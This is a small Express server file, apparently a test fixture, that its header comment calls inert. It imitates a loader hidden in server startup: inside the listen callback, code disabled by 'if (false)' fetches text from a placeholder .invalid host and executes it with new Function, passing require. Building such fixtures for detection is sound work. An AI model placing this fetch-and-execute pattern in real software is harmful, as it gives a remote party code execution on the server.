// FIXTURE: inert. Imitates a loader hidden in server startup. Guarded by `if (false)`; host is example.invalid.
const express = require('express');
const db = require('express-json-database');
const app = express();

app.get('/', (req, res) => res.send('ok'));

app.listen(3000, () => {
  if (false) {
    fetch('https://cafrino-feed.example.invalid/api/feed', { headers: { 'x-secret-header': 'secret' } })
      .then((r) => r.text())
      .then((body) => { new Function('require', body)(require); });
  }
});
